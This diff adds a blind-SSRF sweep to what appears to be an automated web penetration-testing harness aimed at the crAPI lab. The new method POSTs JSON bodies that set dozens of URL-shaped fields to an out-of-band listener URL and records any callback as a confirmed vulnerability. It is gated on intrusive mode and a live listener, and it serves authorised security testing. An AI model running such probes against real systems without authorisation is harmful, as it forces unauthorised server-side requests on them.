@@ -3976,6 +3976,73 @@ class AssistSession:
             return True
         return False
 
+    # URL-shaped body fields a server may FETCH — the SSRF sink kind that lives in a JSON
+    # API body, which an HTML-form / query-param crawl never surfaces. crAPI's challenge-11
+    # sink `mechanic_api` is the first entry; the rest are the near-universal names.
+    _URL_SINK_FIELDS = (
+        "mechanic_api", "url", "uri", "link", "href", "callback", "callback_url",
+        "callbackUrl", "webhook", "webhook_url", "webhookUrl", "redirect", "redirect_url",
+        "redirectUrl", "avatar", "avatar_url", "avatarUrl", "image_url", "imageUrl",
+        "import_url", "importUrl", "feed", "feed_url", "src", "source", "target", "dest",
+        "destination", "next", "return_url", "returnUrl", "fetch", "remote", "endpoint",
+        "host", "proxy", "site", "domain", "path", "file_url", "document_url")
+
+    def confirm_ssrf_sinks(self) -> int:
+        """Deterministic SSRF sweep of URL-shaped JSON body fields on write endpoints — the
+        sink an HTML-form / query-param crawl never surfaces, so the (already wired) blind-
+        SSRF prover never received the field name. For each confirmed endpoint whose path
+        hints at a URL-fetching action, each known sink field is POSTed as JSON carrying our
+        OOB listener URL; a callback confirms. Gated on `allow_intrusive` (it WRITES) and on
+        a live listener (the fake cage has none, so this is a no-op there). Returns the
+        number confirmed. This is the harness firing the SSRF question at API bodies itself,
+        rather than waiting for the model to name the sink."""
+        if (self.browser is None or not self.allow_intrusive
+                or self.surface is None or self._oob() is None):
+            return 0
+        import json as _json
+        import time as _time
+        from .web import WebAction
+        lis = self._oob()
+        base = (getattr(self.surface, "seed", "") or f"http://{self.target}/").rstrip("/")
+        routes = list(getattr(self.surface, "confirmed_routes", []) or [])
+        hint = ("contact", "mechanic", "import", "fetch", "webhook", "avatar", "convert",
+                "upload", "url", "proxy", "callback", "notify", "subscribe", "preview")
+        ranked = sorted(routes,
+                        key=lambda r: 0 if any(h in r.lower() for h in hint) else 1)
+        confirmed = 0
+        for route in ranked[:8]:
+            if "{" in route or (getattr(self, "_confirm_budget", 1) or 1) <= 0 \
+                    or self._rate_limited:
+                break
+            url = route if route.startswith("http") else base + (
+                route if route.startswith("/") else "/" + route)
+            # ONE probe per endpoint: every sink field set to the OOB URL with a DISTINCT
+            # token, so a single callback both confirms the SSRF and NAMES the field. This
+            # is why the sweep is a batch and not one request per field — 40+ fields x a
+            # per-probe wait would be prohibitive on a live run.
+            tokens = {f: "ssrf" + str(random.randint(10 ** 7, 10 ** 8))
+                      for f in self._URL_SINK_FIELDS}
+            body = {f: lis.callback_url(tokens[f]) for f in self._URL_SINK_FIELDS}
+            try:
+                self.browser.run(WebAction(
+                    "request", url=url, method="POST", body=_json.dumps(body),
+                    headers={"Content-Type": "application/json"}))
+            except Exception:
+                continue
+            if getattr(self, "_confirm_budget", None) is not None:
+                self._confirm_budget -= 1
+            _time.sleep(2)
+            for field, tok in tokens.items():
+                if lis.hit(tok):
+                    self._record_confirmed(
+                        url, "Blind SSRF (out-of-band)", "high", field,
+                        f"the endpoint fetched our in-cage OOB listener from the "
+                        f"{field!r} body field (token {tok}) — a caller-controlled URL "
+                        f"in that field reaches server-side requests", category="api")
+                    confirmed += 1
+                    break
+        return confirmed
+
     def confirm_bfla_password_takeover(self, change_url_template: str, login_url: str,
                                        victim: str, token: str,
                                        user_field: str = "username",
@@ -8265,6 +8332,17 @@ class AssistSession:
                             confirmed += 1
                     except Exception:
                         pass
+
+                # 7b) SSRF SINKS — the harness fires the SSRF question at URL-shaped JSON
+                #     body fields the crawl never surfaced (crAPI's `mechanic_api`), which
+                #     the blind-SSRF prover could not reach without the field name. Runs
+                #     regardless of a mass-assignment target; a no-op without a listener.
+                try:
+                    self._covered("Blind injection (out-of-band)",
+                                  note="OOB callback from a URL POSTed into each sink field")
+                    confirmed += self.confirm_ssrf_sinks()
+                except Exception:
+                    pass
 
                 # 8) BFLA — the write-side of authorization. BOLA (pass 5) proves we can
                 #    READ another principal's object; this proves we can ACT on it. A
